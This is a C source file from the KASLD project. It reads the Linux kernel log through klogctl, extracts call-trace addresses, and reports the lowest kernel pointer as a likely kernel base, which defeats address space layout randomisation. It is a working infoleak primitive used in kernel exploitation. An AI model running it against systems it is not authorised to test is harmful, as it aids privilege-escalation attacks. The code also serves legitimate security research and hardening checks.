// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Search kernel log for call traces and return the lowest address
// that looks like a kernel pointer.
//
// Requires:
// - kernel.dmesg_restrict = 0 (Default on Ubuntu systems);
//   or CAP_SYSLOG capabilities.
// - kernel.panic_on_oops = 0 (Default on most systems).

#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/klog.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include "kasld.h"

#define SYSLOG_ACTION_READ_ALL 3
#define SYSLOG_ACTION_SIZE_BUFFER 10

int mmap_syslog(char **buffer, int *size) {
  *size = klogctl(SYSLOG_ACTION_SIZE_BUFFER, 0, 0);

  if (*size == -1) {
    printf("[-] klogctl(SYSLOG_ACTION_SIZE_BUFFER): %m\n");
    return 1;
  }

  *size = (*size / getpagesize() + 1) * getpagesize();
  *buffer = (char *)mmap(NULL, *size, PROT_READ | PROT_WRITE,
                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

  *size = klogctl(SYSLOG_ACTION_READ_ALL, &((*buffer)[0]), *size);

  if (*size == -1) {
    printf("[-] klogctl(SYSLOG_ACTION_READ_ALL): %m\n");
    return 1;
  }

  return 0;
}

unsigned long search_dmesg_kernel_pointers() {
  char *syslog;
  char *ptr;
  int size;
  unsigned long addr = 0;
  unsigned long leaked_addr = 0;

  if (mmap_syslog(&syslog, &size))
    return 0;

  printf("[.] searching dmesg for call trace kernel pointers ...\n");

  ptr = strtok(syslog, "[<");
  while ((ptr = strtok(NULL, "[<")) != NULL) {
    char *endptr = &ptr[strlen(ptr)];
    leaked_addr = (unsigned long)strtoull(&ptr[0], &endptr, 16);

    if (!leaked_addr)
      continue;

    if (leaked_addr >= KERNEL_BASE_MIN && leaked_addr <= KERNEL_BASE_MAX) {
      //printf("Found kernel pointer: %lx\n", leaked_addr);
      if (!addr || leaked_addr < addr)
        addr = leaked_addr;
    }
  }

  return addr;
}

int main(int argc, char **argv) {
  unsigned long addr = search_dmesg_kernel_pointers();
  if (!addr)
    return 1;

  printf("lowest leaked address: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr &~ KERNEL_BASE_MASK);

  return 0;
}
